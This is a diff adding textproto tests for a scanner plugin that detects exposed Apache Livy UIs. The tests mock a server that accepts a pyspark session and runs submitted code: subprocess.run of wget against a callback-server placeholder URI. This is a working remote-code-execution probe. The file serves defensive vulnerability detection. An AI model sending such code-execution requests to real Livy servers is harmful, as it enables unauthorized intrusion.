@@ -1,0 +1,133 @@
+# proto-file: proto/templated_plugin_tests.proto
+# proto-message: TemplatedPluginTests
+
+config: {
+  tested_plugin: "ApacheLivy_ExposedUI"
+}
+
+tests: {
+  name: "whenVulnerable_returnsVuln"
+  expect_vulnerability: true
+
+  mock_callback_server: {
+    enabled: true
+    has_interaction: true
+  }
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/ui"
+        status: 200
+        body_content: '<title>Livy - Sessions</title>'
+      },
+      {
+        uri: "/sessions"
+        status: 201
+        body_content:
+          '{"id":6,"name":null,"appId":null,"owner":null,"proxyUser":null,"state":"starting","kind":"pyspark","appInfo":{"driverLogUrl":null,"sparkUiUrl":null},"log":["stdout: ","\\nstderr: "],"ttl":null,"driverMemory":null,"driverCores":0,"executorMemory":null,"executorCores":0,"conf":{},"archives":[],"files":[],"heartbeatTimeoutInSecond":0,"jars":[],"numExecutors":0,"pyFiles":[],"queue":null}'
+        condition: {
+          body_content: '{"kind":"pyspark"}'
+          headers: [
+            {
+              name: "Content-Type",
+              value: "application/json"
+            }
+          ]
+        }
+      },
+      {
+        uri: "/sessions/6/statements"
+        status: 201
+        condition: {
+          body_content: '{"code":"import subprocess\\nsubprocess.run([\\"wget\\",\\"{{ T_CBS_URI }}\\"])"}'
+          headers: [
+            {
+              name: "Content-Type",
+              value: "application/json"
+            }
+          ]
+        }
+        body_content:
+            '{"id":4,"code":"import subprocess\\nsubprocess.run([\\"wget\\",\\"{{ T_CBS_URI }}\\"])","state":"running","output":null,"progress":0.0,"started":1755100962100,"completed":0}'
+      },
+      {
+        uri: "/sessions/6/statements/4"
+        status: 200
+        body_content:
+            '{"id":0,"code":"import subprocess\\nsubprocess.run([\\"wget\\",\\"{{ T_CBS_URI }}\\"])","state":"available","output":{"status":"ok","execution_count":0,"data":{"text/plain":"/opt"}},"progress":1.0,"started":1754515902001,"completed":1754515902003}'
+      }
+    ]
+  }
+}
+
+
+tests: {
+  name: "whenNotApcheLivy_returnsNoVuln"
+  expect_vulnerability: false
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri:  "/api/v1/main/usages/all"
+        status: 400
+        body_content: "..."
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenNoCallback_returnsFalse"
+  expect_vulnerability: false
+
+  mock_callback_server: {
+    enabled: true
+    has_interaction: false
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/ui"
+        status: 200
+        body_content: '<title>Livy - Sessions</title>'
+      },
+      {
+        uri: "/sessions"
+        status: 201
+        body_content:
+            '{"id":6,"name":null,"appId":null,"owner":null,"proxyUser":null,"state":"starting","kind":"pyspark","appInfo":{"driverLogUrl":null,"sparkUiUrl":null},"log":["stdout: ","\\nstderr: "],"ttl":null,"driverMemory":null,"driverCores":0,"executorMemory":null,"executorCores":0,"conf":{},"archives":[],"files":[],"heartbeatTimeoutInSecond":0,"jars":[],"numExecutors":0,"pyFiles":[],"queue":null}'
+        condition: {
+          body_content: '{"kind":"pyspark"}'
+          headers: [
+            {
+              name: "Content-Type",
+              value: "application/json"
+            }
+          ]
+        }
+      },
+      {
+        uri: "/sessions/6/statements"
+        status: 201
+        condition: {
+          body_content: '{"code":"import subprocess\\nsubprocess.run([\\"wget\\",\\"{{ T_CBS_URI }}\\"])"}'
+          headers: [
+            {
+              name: "Content-Type",
+              value: "application/json"
+            }
+          ]
+        }
+        body_content:
+            '{"id":4,"code":"import subprocess\\nsubprocess.run([\\"wget\\",\\"{{ T_CBS_URI }}\\"])","state":"running","output":null,"progress":0.0,"started":1755100962100,"completed":0}'
+      },
+      {
+        uri: "/sessions/6/statements/4"
+        status: 200
+        body_content:
+            '{"id":0,"code":"import subprocess\\nsubprocess.run([\\"wget\\",\\"{{ T_CBS_URI }}\\"])","state":"available","output":{"status":"ok","execution_count":0,"data":{"text/plain":"/opt"}},"progress":1.0,"started":1754515902001,"completed":1754515902003}'
+      }
+    ]
+  }
+}
